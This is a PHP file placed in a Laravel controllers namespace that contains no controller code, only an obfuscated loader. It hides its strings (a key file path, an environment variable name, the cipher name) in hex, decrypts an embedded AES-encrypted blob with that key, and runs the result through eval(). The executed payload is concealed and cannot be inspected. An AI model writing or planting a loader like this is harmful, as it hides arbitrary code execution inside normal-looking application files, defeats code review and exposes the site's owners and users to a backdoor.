<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('GFUZY44p37qqGNRjFyGy8w==');

$c=base64_decode(

'+yNIFYxR1Qn4fB7KkebDqeVb0trYtWX+9EcmnCGuSUoGlUB9N0Z3Q/vVS8MjCZ2dAyBCRPI1BOFO' .
'CsTcSebm5JzPE0AwXjs2sUpaPlyKjrUsHo9ekd2o65MtpfRjuZc3fmtz8V2dGQUyaSNQe+ujj6/w' .
'HI0Jt14TorO741ua1YxptYhYLHOp357rwZiiLJXEBl9kc2h1eyutIJwUIzvm1WuJ32crPx9Wr4ss' .
'Nsr2oqjMA0OF80H+QqVId3ZtV7sM'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

